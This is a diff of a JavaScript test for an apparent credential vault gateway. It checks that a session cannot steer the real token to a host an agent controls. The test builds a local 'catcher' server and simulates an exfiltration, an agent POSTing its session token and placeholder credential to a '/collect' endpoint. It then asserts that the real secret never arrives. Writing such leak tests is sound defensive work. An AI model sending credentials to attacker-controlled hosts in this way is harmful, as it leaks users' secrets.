@@ -37,7 +37,16 @@ before(async () => {
   gatewayPort = daemon.gatewayPort
 
   captured = []
-  catcher = createServer((req, res) => { captured.push(req.headers.authorization); res.end('{}') })
+  // Everything that arrives, not only the header a token would ride in: a
+  // secret anywhere in the request counts the same.
+  catcher = createServer((req, res) => {
+    const chunks = []
+    req.on('data', (c) => chunks.push(c))
+    req.on('end', () => {
+      captured.push(`${req.method} ${req.url}\n${JSON.stringify(req.headers)}\n${Buffer.concat(chunks)}`)
+      res.end('{}')
+    })
+  })
   await new Promise((r) => catcher.listen(0, '127.0.0.1', r))
   catcherPort = catcher.address().port
 })
@@ -77,7 +86,37 @@ test('a session confined to the credential host cannot then be pointed elsewhere
 test('the real credential value never reaches a caller-controlled destination', async () => {
   // The whole point: after the fix there is no path from a self-minted session
   // to the token landing on a host the agent controls.
-  assert.ok(!captured.some((a) => a && a.includes(SECRET)))
+  //
+  // This used to assert over whatever earlier tests had sent the catcher,
+  // which was nothing, so it held with no request made at all. It makes its
+  // own: each way the gateway might be steered at the catcher, then the one
+  // request that is meant to arrive, the agent sending everything it holds
+  // there directly.
+  const made = await control('POST', '/v1/sessions', {
+    cred: 'test', methods: ['GET', 'POST'], paths: ['/**'], approval: 'auto', budget: 10,
+  })
+  assert.equal(made.status, 200, JSON.stringify(made.body))
+  const { token, placeholder } = made.body
+  const before = captured.length
+
+  for (const method of ['GET', 'POST']) {
+    const res = await fetch(`http://127.0.0.1:${gatewayPort}/t/http/127.0.0.1:${catcherPort}/x`, {
+      method,
+      headers: { host: '127.0.0.1', authorization: `Bearer ${placeholder}`, 'av-session': token },
+      body: method === 'POST' ? JSON.stringify({ token: placeholder }) : undefined,
+    })
+    assert.equal(res.status, 403, `${method} through the gateway was not refused`)
+  }
+
+  const direct = await fetch(`http://127.0.0.1:${catcherPort}/collect`, {
+    method: 'POST',
+    headers: { authorization: `Bearer ${placeholder}`, 'av-session': token },
+    body: JSON.stringify(made.body),
+  })
+  assert.equal(direct.status, 200)
+  assert.equal(captured.length, before + 1, 'the catcher got the direct request, and the gateway forwarded nothing')
+  assert.ok(captured.at(-1).includes(placeholder), 'the catcher records what it is sent')
+  assert.ok(!captured.some((c) => c.includes(SECRET)), 'the real token reached a host the agent controls')
 })
 
 // Before the passphrase is set: once it exists it is this vault's only human
